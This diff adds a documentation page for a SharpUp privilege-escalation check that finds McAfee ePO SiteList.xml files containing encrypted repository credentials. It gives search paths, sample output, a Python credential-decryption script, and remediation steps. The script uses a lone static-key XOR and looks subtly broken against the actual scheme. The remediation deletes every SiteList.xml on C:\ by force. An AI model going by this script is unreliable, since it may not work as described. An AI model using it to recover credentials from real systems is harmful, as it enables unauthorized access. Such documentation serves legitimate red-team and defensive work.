@@ -1,0 +1,76 @@
+---
+title: 'McAfee SiteList Files'
+description: 'McAfee SiteList.xml files with encrypted credentials'
+icon: 'shield-virus'
+---
+
+## Overview
+
+The McAfee SiteList Files check searches for McAfee ePO SiteList.xml files which contain superagent repository credentials. These credentials are encrypted but can be decrypted using a static key, allowing unauthorized access to the McAfee update repository.
+
+## How It Works
+
+SharpUp searches common locations for SiteList.xml files:
+
+- `C:\Program Files\`
+- `C:\Program Files (x86)\`
+- `C:\Documents and Settings\`
+- `C:\Users\`
+
+### Technical Details
+
+The SiteList.xml file contains encrypted credentials for the McAfee Agent to authenticate to the repository server. The encryption uses a weak algorithm with a hardcoded key.
+
+## Example Output
+
+```
+=== McAfee SiteList.xml Files ===
+    C:\Program Files\McAfee\Agent\config\SiteList.xml
+    C:\Program Files (x86)\McAfee\Common Framework\SiteList.xml
+```
+
+## Exploitation
+
+### Decryption
+
+```python
+# Python script to decrypt McAfee SiteList passwords
+import base64
+
+def decrypt_mcafee_password(encrypted_password):
+    # Static XOR key
+    key = "<!@#$%^>"
+    decoded = base64.b64decode(encrypted_password)
+
+    decrypted = ""
+    for i in range(len(decoded)):
+        decrypted += chr(decoded[i] ^ ord(key[i % len(key)]))
+
+    return decrypted
+```
+
+## Remediation
+
+<Steps>
+  <Step title="Remove SiteList Files">
+    ```powershell
+    Get-ChildItem -Path C:\ -Recurse -Filter "SiteList.xml" -ErrorAction SilentlyContinue |
+    Remove-Item -Force
+    ```
+  </Step>
+
+  <Step title="Use ePO Managed Deployment">
+    Deploy agents via ePO server without storing credentials locally.
+  </Step>
+</Steps>
+
+## Related Checks
+
+<CardGroup cols={2}>
+  <Card title="Cached GPP Password" icon="folder" href="/ghostpack-docs/SharpUp-mdx/checks/cachedgpppassword">
+    Check for cached Group Policy passwords
+  </Card>
+  <Card title="Unattended Install Files" icon="file" href="/ghostpack-docs/SharpUp-mdx/checks/unattendedinstallfiles">
+    Find credentials in installation files
+  </Card>
+</CardGroup>
